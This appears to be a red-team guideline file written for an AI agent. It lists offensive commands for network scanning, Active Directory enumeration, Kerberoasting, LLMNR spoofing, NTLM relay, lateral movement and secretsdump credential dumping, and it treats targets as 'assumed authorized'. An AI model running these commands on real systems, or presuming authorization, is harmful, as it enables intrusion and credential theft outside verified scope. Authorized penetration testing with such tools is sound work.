# RedTeam Execution Guidelines

## RedTeam Skill Integration

When performing RedTeam operations, follow these guidelines integrated with the multi-CyberSecurity framework.

## Pre-Engagement

### Scope Definition
1. Confirm target scope is authorized (CTF/Sandbox assumed authorized)
2. Define objectives and success criteria
3. Identify constraints and ROE (Rules of Engagement)

### Tool Readiness
```bash
# Verify tool availability
ls tools/
ls tools/AD/
ls tools/Web/
ls tools/Network/

# Load tool help if needed
tools/fscan.exe -h
tools/nuclei -h
```

## RedTeam Tool Matrix

### Network Reconnaissance
| Tool | Purpose | Command |
|------|---------|---------|
| gogo | Fast asset discovery | `gogo -t 100 -l hosts.txt -q -f gogo.txt` |
| fscan | Comprehensive scan | `fscan -h 192.168.1.0/24 -np -silent -nocolor -o fscan.txt` |
| masscan | Rate-limited scan | `masscan -p1-65535 192.168.1.0/24 --rate=1000` |

### Web Security
| Tool | Purpose | Command |
|------|---------|---------|
| httpx | HTTP fingerprinting | `httpx -l urls.txt -sc -title -server -td -silent -o httpx.txt` |
| nuclei | POC vulnerability scan | `nuclei -l urls.txt -tags cve,rce -s high,critical -nc -o nuclei.txt` |
| ffuf | Directory fuzzing | `ffuf -u http://target/FUZZ -w wordlist.txt -mc 200,301,302 -s -o ffuf.txt` |

### Active Directory
| Tool | Purpose | Command |
|------|---------|---------|
| SharpHound | BloodHound collector (Windows) | `SharpHound.exe -c Default -d corp.local` |
| bloodhound-python | BloodHound collector (Linux) | `bloodhound-python -c Default -d corp.local` |
| kerbrute | Kerberos user enum | `kerbrute userenum -d corp.local --dc DC01 users.txt` |
| pywerview | Domain enum | `pywerview.py get-domain-user -d corp.local --dc-ip IP` |
| ldapdomaindump | LDAP dump | `ldapdomaindump ldap://DC -u 'DOMAIN\user' -p 'pass'` |

### Lateral Movement
| Tool | Purpose | Command |
|------|---------|---------|
| nxc (NetExec) | Multi-protocol attack | `nxc smb 192.168.1.0/24 -u user -p pass --shares` |
| wmiexec | WMI exec (no SMB) | `impacket-wmiexec domain/user:pass@target 'command'` |
| psexec | Service exec | `impacket-psexec domain/user:pass@target cmd.exe` |
| secretsdump | Credential dump | `impacket-secretsdump domain/user:pass@DC -just-dc` |
| ntlmrelayx | NTLM relay | `impacket-ntlmrelayx -t ldap://dc --smb2support` |

### Credential Attacks
| Tool | Purpose | Command |
|------|---------|---------|
| GetNPUsers | AS-REP Roasting | `impacket-GetNPUsers corp.local/ -usersfile users.txt -format hashcat` |
| GetUserSPNs | Kerberoasting | `impacket-GetUserSPNs corp.local/user -request` |
| responder | LLMNR/NBT-NS spoof | `responder -I eth0 -v` |

## Execution Workflow

### Phase 1: Reconnaissance
```bash
# Network recon
gogo -t 100 -i 192.168.1.0/24 -q -f gogo.txt
fscan -h 192.168.1.0/24 -np -silent -nocolor -o fscan.txt

# Web recon
httpx -l targets.txt -sc -title -server -td -silent -o httpx.txt
nuclei -l targets.txt -tags cve,rce -s high,critical -nc -o nuclei.txt
```

### Phase 2: AD Enumeration
```bash
# User enumeration
kerbrute userenum -d corp.local --dc DC01 users.txt -o valid_users.txt

# Domain enum
pywerview.py get-domain-user -d corp.local --dc-ip IP -u user -p pass
ldapdomaindump ldap://DC -u 'DOMAIN\user' -p 'pass' -o ldapdump/

# BloodHound collection
SharpHound.exe -c Default -d corp.local
```

### Phase 3: Credential Attacks
```bash
# AS-REP Roast
impacket-GetNPUsers corp.local/ -usersfile users.txt -format hashcat -outputfile asrep.txt

# Kerberoast
impacket-GetUserSPNs corp.local/user:password -request -outputfile kerberoast.txt

# LLMNR/NBT-NS Spoofing
responder -I eth0 -v
```

### Phase 4: Lateral Movement
```bash
# SMB enum and exploitation
nxc smb 192.168.1.0/24 -u user -p pass --shares --rid-brute

# WMI exec
impacket-wmiexec domain/user:pass@target 'whoami'

# Secrets dump
impacket-secretsdump domain/user:pass@DC -just-dc
```

## Output Optimization

### Token Saving Techniques
```bash
# Remove ANSI colors
| sed 's/\x1b\[[0-9;]*m//g'

# Remove blank lines
| grep -v '^$'

# Extract key information
| grep -E '(Valid|Found|SMB|HTTP|443|445|80|443|8080)'

# Write to file for large outputs
> output.txt 2>&1
```

### Recommended Output Format
```
=== [TARGET] ===
[KEY FINDING]
Evidence: [command output excerpt]
Impact: [security impact]

=== [NEXT TARGET] ===
...
```

## Safety Rules

1. **Scope Verification**: Confirm target is within authorized scope
2. **Least Impact**: Prefer least-invasive techniques first
3. **Reversibility**: Document changes for potential rollback
4. **Evidence Preservation**: Keep logs for reporting
5. **Cleanup**: Remove created users/services when done

## Post-Engagement

1. **Report Generation**: Document all findings with evidence
2. **Attack Path Mapping**: Visualize attack chains
3. **Remediation Prioritization**: Rank by risk/impact
4. **Knowledge Capture**: Update skills with new techniques
